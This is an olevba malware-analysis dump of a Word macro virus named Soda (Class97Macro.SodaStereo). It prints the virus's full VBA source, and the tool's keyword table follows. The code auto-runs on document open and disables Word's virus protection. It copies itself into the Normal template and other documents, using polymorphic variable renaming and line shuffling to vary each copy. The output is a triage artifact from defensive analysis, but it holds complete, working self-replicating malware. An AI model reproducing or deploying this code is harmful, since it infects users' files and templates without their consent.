olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Soda
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Soda - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem Name:   Class97Macro.SodaStereo
Rem Author: Virtual Life LineZer0/Skamwerks


Sub Autoopen()
Dim start(0 To 85) As Integer: Dim neuzeile(1 To 85) As String: Dim zeilen(0 To 85) As String: Dim var(1 To 50) As String: Dim neuvar(1 To 50) As String: GoTo Label0
Label0: VirusProtection = (2 < 1): GoTo Label30
Label30: Set ntta = NormalTemplate: GoTo Label31
Label31: Set nttb = ntta.VBProject: GoTo Label32
Label32: Set nttc = nttb.VBComponents: GoTo Label33
Label33: Set nttd = nttc.Item(1): GoTo Label34
Label34: Set ntt = nttd.codemodule: GoTo Label35
Label35: Set acda = ActiveDocument: GoTo Label36
Label36: Set acdb = acda.VBProject: GoTo Label37
Label37: Set acdc = acdb.VBComponents: GoTo Label38
Label38: Set acdd = acdc.Item(1): GoTo Label39
Label39: Set acd = acdd.codemodule: GoTo Label40
Label40: If ntt.Find("VL", 1, 1, ntt.CountOfLines, 1, False, False) Then GoTo Label41 Else GoTo Label44
Label41: If acd.Find("VL", 1, 1, acd.CountOfLines, 1, False, False) Then Exit Sub Else GoTo Label42
Label42: Set Target = acd: GoTo Label43
Label43: Set Host = ntt: GoTo Label46
Label44: Set Target = ntt: GoTo Label45
Label45: Set Host = acd: GoTo Label46
Label46: If Target.CountOfLines > 1 Then GoTo Label47 Else GoTo Label48
Label47: Target.deletelines 1, Target.CountOfLines: GoTo Label48
Label48: vcode = Host.lines(2, 78): GoTo Label49
Label49: Randomize: GoTo Label50
Label50: zaehler = 1: GoTo Label51
Label51: If (Mid(Host.lines(zaehler, 1), 1, 2) <> "';" And Host.CountOfLines > i) Then GoTo Label52 Else GoTo Label53
Label52: zaehler = zaehler + 1: GoTo Label51
';vcode;neuzeile;laenge;zeilen;ntt;acd;zeichen;chiffre;neuvar;maxlabel;anzvar;zeile;start;var;neulist;Target;host;zaehler2;zaehler3;zaehler;Label1;Label2;Label3;Label5;Label6;Label7;Label;
Label53: anzvar = 0: GoTo Label54
Label54: zeile = Host.lines(zaehler, 1): GoTo Label55
Label55: zeichen = 3: GoTo Label56
Label56: If zeichen <= Len(zeile) Then GoTo Label57 Else GoTo Label69
Label57: If Mid(zeile, zeichen, 1) <> ";" Then GoTo Label58 Else GoTo Label59
Label58: chiffre = chiffre + Mid(zeile, zeichen, 1): GoTo Label68
Label59: anzvar = anzvar + 1: GoTo Label60
Label60: var(anzvar) = chiffre: GoTo Label61
Label61: neuvar(anzvar) = "": GoTo Label62
Label62: zaehler = 1: zaehler3 = Int(Rnd * 4 + 4): GoTo Label63
Label63: If zaehler < zaehler3 Then GoTo Label64 Else GoTo Label66
Label64: neuvar(anzvar) = neuvar(anzvar) + Chr(Int(Rnd() * 25 + 65)): GoTo Label65
Label65: zaehler = zaehler + 1: GoTo Label63
Label66: neulist = neulist & neuvar(anzvar) & ";": GoTo Label67
Label67: chiffre = "": GoTo Label68
Label68: zeichen = zeichen + 1: GoTo Label56
Label69: zaehler = 1: GoTo Label70
Label70: If zaehler <= anzvar Then GoTo Label71 Else GoTo Label1
Label71: zeichen = InStr(vcode, var(zaehler)): GoTo Label72
Label72: If zeichen <> 0 Then GoTo Label73 Else GoTo Label74
Label73: vcode = Left(vcode, zeichen - 1) + neuvar(zaehler) + Mid(vcode, zeichen + Len(var(zaehler))): GoTo Label71
Label74: zaehler = zaehler + 1: GoTo Label70
Label1: maxlabel = 0: GoTo Label2
Label2: startzeile = 1: GoTo Label3
Label3: zaehler = 1: GoTo Label4
Label4: If zaehler <= Len(vcode) Then GoTo Label5 Else GoTo Label11
Label5: If Mid(vcode, zaehler, 1) = vbCr Then GoTo Label6 Else GoTo Label10
Label6: zeilen(maxlabel) = Mid(vcode, startzeile, zaehler - startzeile): GoTo Label7
Label7: start(maxlabel) = zaehler: GoTo Label8
Label8: maxlabel = maxlabel + 1: GoTo Label9
Label9: startzeile = zaehler + 1: GoTo Label10
Label10: zaehler = zaehler + 1: GoTo Label4
Label11: zaehler = 1: GoTo Label12
Label12: If zaehler <= maxlabel Then GoTo Label13 Else GoTo Label22
Label13: zaehler2 = Int(Rnd * (maxlabel - zaehler) + 1): GoTo Label14
Label14: zaehler3 = 0: GoTo Label15
Label15: zaehler4 = 0: GoTo Label16
Label16: If zaehler3 < zaehler2 Then GoTo Label17 Else GoTo Label20
Label17: If neuzeile(zaehler4 + 1) = "" Then GoTo Label18 Else GoTo Label19
Label18: zaehler3 = zaehler3 + 1: GoTo Label19
Label19: zaehler4 = zaehler4 + 1: GoTo Label16
Label20: neuzeile(zaehler4) = zeilen(zaehler): GoTo Label21
Label21: zaehler = zaehler + 1: GoTo Label12
Label22: vcode = zeilen(0) + vbCr: GoTo Label23
Label23: zaehler = 1: GoTo Label24
Label24: If zaehler < maxlabel Then GoTo Label25 Else GoTo Label27
Label25: vcode = vcode + neuzeile(zaehler) + vbCr: GoTo Label26
Label26: zaehler = zaehler + 1: GoTo Label24
Label27: Target.insertlines 1, vcode & "End Sub": GoTo Label28
Label28: Target.insertlines 1, Host.lines(1, 1): GoTo Label29
Label29: Exit Sub
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Virtual             |May detect virtualization                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

